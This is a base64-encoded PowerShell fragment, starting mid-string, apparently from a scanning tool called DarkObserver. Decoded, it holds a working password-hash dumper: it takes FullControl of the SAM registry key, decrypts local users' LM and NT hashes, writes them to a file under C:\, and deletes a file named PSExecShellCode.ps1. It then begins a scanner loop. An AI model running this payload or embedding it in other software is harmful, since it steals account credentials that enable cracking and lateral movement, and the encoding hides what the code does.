1Vc2VyTmFtZShbYnl0ZVtdXSRWKSAKeyAKaWYgKC1ub3QgJFYpIHtyZXR1cm4gJG51bGx9OyAKJG9mZnNldCA9IFtCaXRDb252ZXJ0ZXJdOjpUb0ludDMyKCRWWzB4MGMuLjB4MGZdLDApICsgMHhDQzsgCiRsZW4gPSBbQml0Q29udmVydGVyXTo6VG9JbnQzMigkVlsweDEwLi4weDEzXSwwKTsgCnJldHVybiBbVGV4dC5FbmNvZGluZ106OlVuaWNvZGUuR2V0U3RyaW5nKCRWLCAkb2Zmc2V0LCAkbGVuKTsgCn0gCiAKZnVuY3Rpb24gR2V0LVVzZXJIYXNoZXMoJHUsIFtieXRlW11dJGhib290a2V5KSAKeyAKW2J5dGVbXV0kZW5jX2xtX2hhc2ggPSAkbnVsbDsgW2J5dGVbXV0kZW5jX250X2hhc2ggPSAkbnVsbDsgCiAKIyBjaGVjayBpZiBoYXNoZXMgZXhpc3QgKGlmIGJ5dGUgbWVtb3J5IGVxdWFscyB0byAyMCwgdGhlbiB3ZSd2ZSBnb3QgYSBoYXNoKSAKJExNX2V4aXN0cyA9ICRmYWxzZTsgCiROVF9leGlzdHMgPSAkZmFsc2U7IAojIExNIGhlYWRlciBjaGVjayAKaWYgKCR1LlZbMHhhMC4uMHhhM10gLWVxIDIwKSAKeyAKJExNX2V4aXN0cyA9ICR0cnVlOyAKfSAKIyBOVCBoZWFkZXIgY2hlY2sgCmVsc2VpZiAoJHUuVlsweGFjLi4weGFmXSAtZXEgMjApIAp7IAokTlRfZXhpc3RzID0gJHRydWU7IAp9IAogCmlmICgkTE1fZXhpc3RzIC1lcSAkdHJ1ZSkgCnsgCiRsbV9oYXNoX29mZnNldCA9ICR1Lkhhc2hPZmZzZXQgKyA0OyAKJG50X2hhc2hfb2Zmc2V0ID0gJHUuSGFzaE9mZnNldCArIDggKyAweDEwOyAKJGVuY19sbV9oYXNoID0gJHUuVlskKCRsbV9oYXNoX29mZnNldCkuLiQoJGxtX2hhc2hfb2Zmc2V0KzB4MGYpXTsgCiRlbmNfbnRfaGFzaCA9ICR1LlZbJCgkbnRfaGFzaF9vZmZzZXQpLi4kKCRudF9oYXNoX29mZnNldCsweDBmKV07IAp9IAogCmVsc2VpZiAoJE5UX2V4aXN0cyAtZXEgJHRydWUpIAp7IAokbnRfaGFzaF9vZmZzZXQgPSAkdS5IYXNoT2Zmc2V0ICsgODsgCiRlbmNfbnRfaGFzaCA9IFtieXRlW11dJHUuVlskKCRudF9oYXNoX29mZnNldCkuLiQoJG50X2hhc2hfb2Zmc2V0KzB4MGYpXTsgCn0gCnJldHVybiAsKERlY3J5cHRIYXNoZXMgJHUuUmlkICRlbmNfbG1faGFzaCAkZW5jX250X2hhc2ggJGhib290a2V5KTsgCn0gCiAKZnVuY3Rpb24gRGVjcnlwdEhhc2hlcygkcmlkLCBbYnl0ZVtdXSRlbmNfbG1faGFzaCwgW2J5dGVbXV0kZW5jX250X2hhc2gsIFtieXRlW11dJGhib290a2V5KSAKeyAKW2J5dGVbXV0kbG1oYXNoID0gJGVtcHR5X2xtOyBbYnl0ZVtdXSRudGhhc2g9JGVtcHR5X250OyAKIyBMTSBIYXNoIAppZiAoJGVuY19sbV9oYXNoKSAKeyAKJGxtaGFzaCA9IERlY3J5cHRTaW5nbGVIYXNoICRyaWQgJGhib290a2V5ICRlbmNfbG1faGFzaCAkYWxtcGFzc3dvcmQ7IAp9IAogCiMgTlQgSGFzaCAKaWYgKCRlbmNfbnRfaGFzaCkgCnsgCiRudGhhc2ggPSBEZWNyeXB0U2luZ2xlSGFzaCAkcmlkICRoYm9vdGtleSAkZW5jX250X2hhc2ggJGFudHBhc3N3b3JkOyAKfSAKIApyZXR1cm4gLCgkbG1oYXNoLCRudGhhc2gpIAp9IAogCmZ1bmN0aW9uIERlY3J5cHRTaW5nbGVIYXNoKCRyaWQsW2J5dGVbXV0kaGJvb3RrZXksW2J5dGVbXV0kZW5jX2hhc2gsW2J5dGVbXV0kbG1udHN0cikgCnsgCiRkZXNrZXlzID0gc2lkX3RvX2tleSAkcmlkOyAKJG1kNSA9IFtTZWN1cml0eS5DcnlwdG9ncmFwaHkuTUQ1XTo6Q3JlYXRlKCk7IAokcmM0X2tleSA9ICRtZDUuQ29tcHV0ZUhhc2goJGhib290a2V5WzAuLjB4MGZdICsgW0JpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRyaWQpICsgJGxtbnRzdHIpOyAKJHJjNCA9IE5ld1JDNCAkcmM0X2tleTsgCiRvYmZrZXkgPSAkcmM0LmVuY3J5cHQoJGVuY19oYXNoKTsgCiRoYXNoID0gKGRlc19kZWNyeXB0ICRvYmZrZXlbMC4uN10gJGRlc2tleXNbMF0pICsgCihkZXNfZGVjcnlwdCAkb2Jma2V5WzguLiQoJG9iZmtleS5MZW5ndGggLSAxKV0gJGRlc2tleXNbMV0pOyAKcmV0dXJuICwkaGFzaDsgCn0gCiAKZnVuY3Rpb24gR2V0LVVzZXJLZXlzIAp7IApscyBIS0xNOlxTQU1cU0FNXERvbWFpbnNcQWNjb3VudFxVc2VycyB8IAp3aGVyZSB7JF8uUFNDaGlsZE5hbWUgLW1hdGNoICJeWzAtOUEtRmEtZl17OH0kIn0gfCAKQWRkLU1lbWJlciBBbGlhc1Byb3BlcnR5IEtleU5hbWUgUFNDaGlsZE5hbWUgLVBhc3NUaHJ1IHwgCkFkZC1NZW1iZXIgU2NyaXB0UHJvcGVydHkgUmlkIHtbQ29udmVydF06OlRvSW50MzIoJHRoaXMuUFNDaGlsZE5hbWUsIDE2KX0gLVBhc3NUaHJ1IHwgCkFkZC1NZW1iZXIgU2NyaXB0UHJvcGVydHkgViB7W2J5dGVbXV0oJHRoaXMuR2V0VmFsdWUoIlYiKSl9IC1QYXNzVGhydSB8IApBZGQtTWVtYmVyIFNjcmlwdFByb3BlcnR5IFVzZXJOYW1lIHtHZXQtVXNlck5hbWUoJHRoaXMuR2V0VmFsdWUoIlYiKSl9IC1QYXNzVGhydSB8IApBZGQtTWVtYmVyIFNjcmlwdFByb3BlcnR5IEhhc2hPZmZzZXQge1tCaXRDb252ZXJ0ZXJdOjpUb1VJbnQzMigkdGhpcy5HZXRWYWx1ZSgiViIpWzB4OWMuLjB4OWZdLDApICsgMHhDQ30gLVBhc3NUaHJ1IAp9IAogCmZ1bmN0aW9uIER1bXBIYXNoZXMgCnsgCkxvYWRBcGkgCiRib290a2V5ID0gR2V0LUJvb3RLZXk7IAokaGJvb3RLZXkgPSBHZXQtSEJvb3RLZXkgJGJvb3RrZXk7IApHZXQtVXNlcktleXMgfCAleyAKJGhhc2hlcyA9IEdldC1Vc2VySGFzaGVzICRfICRoQm9vdEtleTsgCiJ7MH06ezF9OnsyfTp7M30iIC1mICgkXy5Vc2VyTmFtZSwkXy5SaWQsIApbQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJGhhc2hlc1swXSkuUmVwbGFjZSgiLSIsIiIpLlRvTG93ZXIoKSwgI0xNIGhhc2gKW0JpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRoYXNoZXNbMV0pLlJlcGxhY2UoIi0iLCIiKS5Ub0xvd2VyKCkpOyAjTlQgaGFzaAp9IAp9IAogCiNodHRwOi8vd3d3LmxhYm9mYXBlbmV0cmF0aW9udGVzdGVyLmNvbS8yMDEzLzA1L3Bvc2hpbmctaGFzaGVzLXBhcnQtMi5odG1sP3Nob3dDb21tZW50PTEzODY3MjU4NzQxNjcjYzg1MTM5ODA3MjU4MjM3NjQwNjAgCmlmICgtTk9UIChbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NQcmluY2lwYWxdW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHldOjpHZXRDdXJyZW50KCkpLklzSW5Sb2xlKFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0J1aWx0SW5Sb2xlXSAiQWRtaW5pc3RyYXRvciIpKSAKeyAKUmV0dXJuIAp9ICAKZWxzZSAKeyAKI1NldCBwZXJtaXNzaW9ucyBmb3IgdGhlIGN1cnJlbnQgdXNlci4gCiRydWxlID0gTmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuQWNjZXNzQ29udHJvbC5SZWdpc3RyeUFjY2Vzc1J1bGUgKCAKW1N5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpLk5hbWUsIAoiRnVsbENvbnRyb2wiLCAKW1N5c3RlbS5TZWN1cml0eS5BY2Nlc3NDb250cm9sLkluaGVyaXRhbmNlRmxhZ3NdIk9iamVjdEluaGVyaXQsQ29udGFpbmVySW5oZXJpdCIsIApbU3lzdGVtLlNlY3VyaXR5LkFjY2Vzc0NvbnRyb2wuUHJvcGFnYXRpb25GbGFnc10iTm9uZSIsIApbU3lzdGVtLlNlY3VyaXR5LkFjY2Vzc0NvbnRyb2wuQWNjZXNzQ29udHJvbFR5cGVdIkFsbG93IikgCiRrZXkgPSBbTWljcm9zb2Z0LldpbjMyLlJlZ2lzdHJ5XTo6TG9jYWxNYWNoaW5lLk9wZW5TdWJLZXkoIAoiU0FNXFNBTVxEb21haW5zIiwgCltNaWNyb3NvZnQuV2luMzIuUmVnaXN0cnlLZXlQZXJtaXNzaW9uQ2hlY2tdOjpSZWFkV3JpdGVTdWJUcmVlLCAKW1N5c3RlbS5TZWN1cml0eS5BY2Nlc3NDb250cm9sLlJlZ2lzdHJ5UmlnaHRzXTo6Q2hhbmdlUGVybWlzc2lvbnMpIAokYWNsID0gJGtleS5HZXRBY2Nlc3NDb250cm9sKCkgCiRhY2wuU2V0QWNjZXNzUnVsZSgkcnVsZSkgCiRrZXkuU2V0QWNjZXNzQ29udHJvbCgkYWNsKSAKIApEdW1wSGFzaGVzIAogCiNSZW1vdmUgdGhlIHBlcm1pc3Npb25zIGFkZGVkIGFib3ZlLiAKJHVzZXIgPSBbU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHldOjpHZXRDdXJyZW50KCkuTmFtZSAKJGFjbC5BY2Nlc3MgfCB3aGVyZSB7JF8uSWRlbnRpdHlSZWZlcmVuY2UuVmFsdWUgLWVxICR1c2VyfSB8ICV7JGFjbC5SZW1vdmVBY2Nlc3NSdWxlKCRfKX0gfCBPdXQtTnVsbCAKU2V0LUFjbCBIS0xNOlxTQU1cU0FNXERvbWFpbnMgJGFjbCAKfSAKfSAKCkdldC1QYXNzSGFzaGVzIHwlewoJJEhhc2hTdHJpbmcgPSAkXy5yZXBsYWNlKCI6IiwgIiwiKQoJIiRlbnY6Y29tcHV0ZXJuYW1lLCRIYXNoU3RyaW5nIiB8IEFkZC1Db250ZW50ICJDOlxIYXNoRHVtcDM5MjEyNTI4MSIKfQpSZW1vdmUtSXRlbSAtRm9yY2UgIkM6XFBTRXhlY1NoZWxsQ29kZS5wczEiCn0KCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiNFTkQgU2NyaXB0IEJsb2NrcyBmb3IgRGVwbG95YWJsZSBwYXlsb2FkcwojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKJHNjYW4ubXR4ID0gTmV3LU9iamVjdCBTeXN0ZW0uVGhyZWFkaW5nLk11dGV4KCRmYWxzZSwgIk15TXV0ZXgiKQoKJHRvZGF5ID0gKGdldC1kYXRlKS5Ub1N0cmluZygiZGRNTU15eSIpICN1c2VkIGZvciBjcmVhdGlvbiBvZiB0ZW1wIGRpcmVjdG9yeQokRmlyc3RSdW5Db21wcz0kdHJ1ZSAjY29tcHV0ZXIgbGlzdCBoYXMgbm90IGJlZW4gZ2VuZXJhdGVkIHlldAokU2NhbkNob2ljZUFycmF5ID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0ICNhcnJheSB0byBob2xkIHNjYW4gY2hvaWNlcwokUFNTY3JpcHRSb290ID0gU3BsaXQtUGF0aCAtUGFyZW50IC1QYXRoICRNeUludm9jYXRpb24uTXlDb21tYW5kLkRlZmluaXRpb24gI2xvY2F0aW9uIG9mIHNjcmlwdAoKI1N0b3JlIGN1cnJlbnQgY29uc29sZSBjb2xvcnMgdG8gcmVzZXQgd2hlbiBzY3JpcHQgZXhpdHMKJEJhY2tncm91bmRDb2xvciA9IFtjb25zb2xlXTo6QmFja2dyb3VuZENvbG9yICAKJEZvcmVncm91bmRDb2xvciA9IFtDb25zb2xlXTo6Rm9yZWdyb3VuZENvbG9yIAoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyMjIwkgRU5EIEluaXRpYWxpemUgVmFyaWFibGVzICAgICAgICMjIyMKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojIyMjCSAgQmVnaW4gU2NyaXB0IEV4ZWN1dGlvbiAgICAgICAgIyMjIwojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKQ2hlY2tEZXBlbmRhbmNpZXMgJFBTU2NyaXB0Um9vdApbY29uc29sZV06OkJhY2tncm91bmRDb2xvciA9ICJCbGFjayIKW0NvbnNvbGVdOjpGb3JlZ3JvdW5kQ29sb3IgPSAiV2hpdGUiClJlc2l6ZQpDbGVhci1Ib3N0CkFzY2lpQXJ0ClNldEtub3duR29vZAp3aGlsZSgkdHJ1ZSkKewoJRGFya09ic2VydmVyCgkkU2NhbkNob2ljZUFycmF5LkNsZWFyKCkKCXRyeSB7CgkJaWYgKFRlc3QtUGF0aCAkVEVNUF9ESVIgLUVycm9yQWN0aW9uIFN0b3ApewoJCQlSZW1vdmUtSXRlbSAtUmVjdXJzZSAtRm9yY2UgIiRURU1QX0RJUiIKCQl9Cgl9IGNhdGNoIHt9Cn0KJHNjYW4ubXR4PSRudWxsCkNsZWFyLUhvc3QKCgoK
